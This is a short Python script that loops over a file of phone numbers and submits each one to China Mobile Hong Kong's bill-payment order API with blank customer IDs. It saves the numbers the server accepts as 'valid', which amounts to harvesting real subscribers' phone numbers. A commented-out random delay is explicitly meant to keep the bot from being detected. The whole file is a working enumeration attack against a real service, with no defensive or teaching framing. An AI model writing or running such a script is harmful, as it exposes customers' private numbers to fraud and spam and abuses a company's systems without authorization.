import requests
import json
import time
import random

url = "https://eshop.hk.chinamobile.com/cmhkapi/bill/createPaidBillOrder"
payload = {"customerId":"","payType":"ASIAPAY","acc":[{"accountbalance":3400,"customerId":"","msisdn":""}]}

with open("123.txt", "r") as file:
	for line in file:
		payload["acc"][0]["msisdn"] = line.strip()
		print("number:  ", line.strip())
		response = requests.post(url, json=payload)
		if response.status_code == 200:
			response_data = json.loads(response.text)
			if response_data["msg"] == "success":
				with open("valid.txt", "a") as valid_number:
					valid_number.write(line)
		else:
			print("Error:", response.status_code, response.text)
			continue

		# Randomly send requests between 3 and 10 seconds so that bot is not detected.
		# sleep_time = random.uniform(3, 10)
		# time.sleep(sleep_time)
